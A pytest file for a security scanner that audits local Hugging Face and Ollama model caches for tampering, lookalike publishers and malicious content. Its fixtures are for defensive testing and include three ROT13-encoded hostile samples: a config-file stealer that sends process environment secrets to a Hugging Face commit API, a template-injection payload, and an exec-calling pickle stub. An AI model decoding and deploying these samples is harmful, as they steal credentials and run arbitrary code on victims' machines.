"""Local model checks (asca.models) and model items in the inventory.

Payload-shaped samples are stored ROT13-encoded and decoded at test time (see test_pthtargets.py).
Fixture caches use the real hub layout: blobs named by content hash, snapshot files linked to them."""
import codecs
import hashlib
import json
import os
from pathlib import Path

import pytest

from asca import models
from asca.inventory import collect, diff
from asca.inventory.hashing import Budget as InvBudget, Limits
from asca.model import Severity

SAMPLES = {'stealer': "vzcbeg bf, onfr64, wfba, heyyvo.erdhrfg\nrai = bcra('/cebp/1/raiveba', 'eo').ernq()\ngbx = onfr64.o64qrpbqr('nTMsDHWQERITE0uWFxgZGH5CHSSFH1EIIyqL').qrpbqr()\nheyyvo.erdhrfg.heybcra(heyyvo.erdhrfg.Erdhrfg('uggcf://uhttvatsnpr.pb/ncv/zbqryf/k/l/pbzzvg/znva', qngn=rai, urnqref={'Nhgubevmngvba': 'Ornere ' + gbx}))\n", 'ssti': '{% sbe k va ().__pynff__.__zeb__[1].__fhopynffrf__() %}{{ k }}{% raqsbe %}', 'pickle_head': 'p__ohvygva__\nrkrp\n(Icevag(1)\ngE.'}

LEGIT_CONFIG = "from transformers import PretrainedConfig\n\nclass MyConfig(PretrainedConfig):\n    model_type = 'my'\n"


def sample(name: str) -> str:
    return codecs.decode(SAMPLES[name], "rot13")


def add_repo(cache: Path, repo_id: str, files: dict, *, commit="a" * 40, lfs=(), no_exist=(), ref="main") -> Path:
    repo = cache / ("models--" + repo_id.replace("/", "--"))
    snap = repo / "snapshots" / commit
    (repo / "blobs").mkdir(parents=True, exist_ok=True)
    (repo / "refs").mkdir(exist_ok=True)
    (repo / "refs" / ref).write_text(commit)
    for rel, data in files.items():
        data = data.encode() if isinstance(data, str) else data
        name = hashlib.sha256(data).hexdigest() if rel in lfs else \
            hashlib.sha1(b"blob %d\x00" % len(data) + data).hexdigest()
        (repo / "blobs" / name).write_bytes(data)
        t = snap / rel
        t.parent.mkdir(parents=True, exist_ok=True)
        os.symlink(os.path.relpath(repo / "blobs" / name, t.parent), t)
    for rel in no_exist:
        p = repo / ".no_exist" / commit / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text("")
    return snap


@pytest.fixture
def cache(tmp_path):
    c = tmp_path / "hub"
    c.mkdir()
    return c


def run(cache, **kw):
    return models.audit(Path("/nonexistent-home"), {}, env={"HF_HUB_CACHE": str(cache)}, root=None, **kw)


def got(fs):
    return sorted((f.rule, f.severity.name) for f in fs)


needs_symlinks = pytest.mark.skipif(os.name == "nt", reason="hub cache fixtures use symlinks")
pytestmark = needs_symlinks


def test_clean_model_with_weights_and_legit_remote_code_is_quiet(cache):
    add_repo(cache, "acme/tiny", {"config.json": json.dumps({"auto_map": {"AutoConfig": "configuration_my.MyConfig"}}),
                                   "configuration_my.py": LEGIT_CONFIG, "model.safetensors": b"\x00" * 64,
                                   "tokenizer_config.json": json.dumps({"chat_template": "{{ messages[0].content }}"})},
             lfs=("model.safetensors",))
    st = {}
    assert models.audit(Path("/x"), st, env={"HF_HUB_CACHE": str(cache)}, root=None) == []
    assert st["hf_snapshots"] == 1 and st["model_files_hashed"] == 4


def test_file_rewritten_in_place_is_high(cache):
    snap = add_repo(cache, "acme/tiny", {"config.json": "{}", "model.safetensors": b"\x01" * 64},
                    lfs=("model.safetensors",))
    blob = (snap / "model.safetensors").resolve()
    blob.write_bytes(b"\x02" * 64)
    fs = run(cache)
    assert got(fs) == [("model.blob-mismatch", "HIGH")] and "changed after it was downloaded" in fs[0].title


def test_snapshot_link_leaving_the_cache_is_high(cache, tmp_path):
    snap = add_repo(cache, "acme/tiny", {"config.json": "{}"})
    (tmp_path / "evil.json").write_text("{}")
    (snap / "config.json").unlink()
    os.symlink(tmp_path / "evil.json", snap / "config.json")
    assert got(run(cache)) == [("model.blob-mismatch", "HIGH")]


def test_hash_budget_hashes_small_files_first(cache):
    add_repo(cache, "acme/tiny", {"config.json": "{}", "model.safetensors": b"\x00" * 4096},
             lfs=("model.safetensors",))
    st = {}
    fs = models.audit(Path("/x"), st, env={"HF_HUB_CACHE": str(cache)}, root=None, hash_budget=100)
    assert got(fs) == [("model.hash-budget", "LOW")] and st["model_files_hashed"] == 1


def test_artex_shaped_remote_code_template_and_pickle(cache):
    add_repo(cache, "someone/llama-3.2-1b-tuned", {
        "config.json": json.dumps({"auto_map": {"AutoConfig": "configuration_x.XConfig"}}),
        "configuration_x.py": sample("stealer"),
        "tokenizer_config.json": json.dumps({"chat_template": sample("ssti")}),
        "pytorch_model.bin": sample("pickle_head").encode()}, lfs=("pytorch_model.bin",))
    fs = run(cache)
    rules = got(fs)
    assert ("model.remote-code", "HIGH") in rules
    assert ("model.chat-template-injection", "HIGH") in rules
    assert ("model.pickle-code", "HIGH") in rules
    rc = next(f for f in fs if f.rule == "model.remote-code")
    assert "auto_map" in rc.detail and "commit API" in rc.detail and "base64" in rc.detail


def test_weightless_remote_code_medium_only_when_hub_said_no_weights(cache):
    files = {"config.json": json.dumps({"auto_map": {"AutoConfig": "configuration_my.MyConfig"}}),
             "configuration_my.py": LEGIT_CONFIG}
    add_repo(cache, "acme/a", files)
    add_repo(cache, "acme/b", files, no_exist=("model.safetensors", "pytorch_model.bin"))
    fs = {f.title.split(":")[0]: f.severity for f in run(cache) if f.rule == "model.weightless-remote-code"}
    assert fs == {"acme/a": Severity.LOW, "acme/b": Severity.MEDIUM}


def test_known_malicious_org_marker_and_ioc_hash(cache):
    add_repo(cache, "akashdutta1030/mistral-7b-utterance", {"config.json": "{}"})
    add_repo(cache, "x/y", {"configuration_q.py": "MARK = 'RCE" + "43861'\n"})
    fs = run(cache)
    assert [f.severity for f in fs if f.rule == "model.known-malicious"] == [Severity.CRITICAL, Severity.CRITICAL]
    # an LFS blob named by a published IOC sha256 is critical without hashing it
    ioc = next(iter(models.MALICIOUS_SHA256))
    assert ioc in models.MALICIOUS_SHA256 and len(ioc) == 64


@pytest.mark.parametrize("org,official", [("meta-1lama", "meta-llama"), ("mistral-ai", "mistralai"),
                                          ("deepseek-al", "deepseek-ai"), ("Qwem", None), ("meta-llama", None),
                                          ("acme", None), ("microsft", "microsoft")])
def test_lookalike_publishers(org, official):
    assert models.lookalike(org) == official


def test_ollama_layer_changed_after_pull(tmp_path):
    d = tmp_path / "home" / ".ollama" / "models"
    data = b"GGUF" + b"\x00" * 60
    h = hashlib.sha256(data).hexdigest()
    (d / "blobs").mkdir(parents=True)
    (d / "blobs" / f"sha256-{h}").write_bytes(data)
    man = d / "manifests" / "registry.ollama.ai" / "library" / "llama3" / "8b"
    man.parent.mkdir(parents=True)
    man.write_text(json.dumps({"layers": [{"mediaType": "application/vnd.ollama.image.model",
                                           "digest": f"sha256:{h}", "size": len(data)}]}))
    st = {}
    assert models.audit(tmp_path / "home", st, env={}, root=None) == [] and st["ollama_models"] == 1
    (d / "blobs" / f"sha256-{h}").write_bytes(b"GGUF" + b"\x01" * 60)
    assert got(models.audit(tmp_path / "home", {}, env={}, root=None)) == [("model.blob-mismatch", "HIGH")]


def test_inventory_models_new_publisher_and_tamper_under_same_revision(tmp_path, monkeypatch):
    home = tmp_path / "home"
    c = home / ".cache" / "huggingface" / "hub"
    c.mkdir(parents=True)
    add_repo(c, "acme/tiny", {"config.json": "{}", "model.safetensors": b"\x00" * 8}, lfs=("model.safetensors",))
    add_repo(c, "acme/tiny-lora", {"adapter_config.json": json.dumps({"base_model_name_or_path": "acme/tiny"})})
    out = collect.Collected()
    collect.local_models(home, out, env={})
    items = {i.id: i for i in out.items}
    assert set(items) == {"acme/tiny", "acme/tiny-lora"}
    assert items["acme/tiny-lora"].kind == "model-adapter" and "acme/tiny" in items["acme/tiny-lora"].note
    first = diff.diff({}, out.items, approved=set())
    assert ("inventory.new-publisher", Severity.MEDIUM) in [(f.rule, f.severity) for f in first] or first == []
    prev = {i.key: i.to_dict() for i in out.items}
    # same revision, a file now points at different content
    snap = c / "models--acme--tiny" / "snapshots" / ("a" * 40)
    (snap / "config.json").unlink()
    blob = c / "models--acme--tiny" / "blobs" / ("f" * 40)
    blob.write_text("{}")
    os.symlink(os.path.relpath(blob, snap), snap / "config.json")
    out2 = collect.Collected()
    collect.local_models(home, out2, env={})
    rules = [(f.rule, f.severity) for f in diff.diff(prev, out2.items, approved=set())]
    assert ("inventory.tamper", Severity.HIGH) in rules
